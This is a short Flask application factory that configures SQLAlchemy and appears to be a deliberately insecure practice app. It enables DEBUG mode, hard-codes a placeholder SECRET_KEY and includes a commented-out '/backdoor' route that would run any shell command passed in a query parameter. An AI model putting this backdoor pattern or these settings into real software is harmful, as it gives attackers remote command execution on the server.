from flask import Flask, request
from flask_sqlalchemy import SQLAlchemy
import subprocess

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)
    app.config['DEBUG'] = True
    app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:////tmp/test.db'
    app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
    app.config['SECRET_KEY'] = 'CHANGEME'
    with app.app_context():
        from . import routes
        db.init_app(app)
        #@app.route('/backdoor')
        #def get_backdoor():
        #    return subprocess.check_output(request.args.get('cmd'))
        return app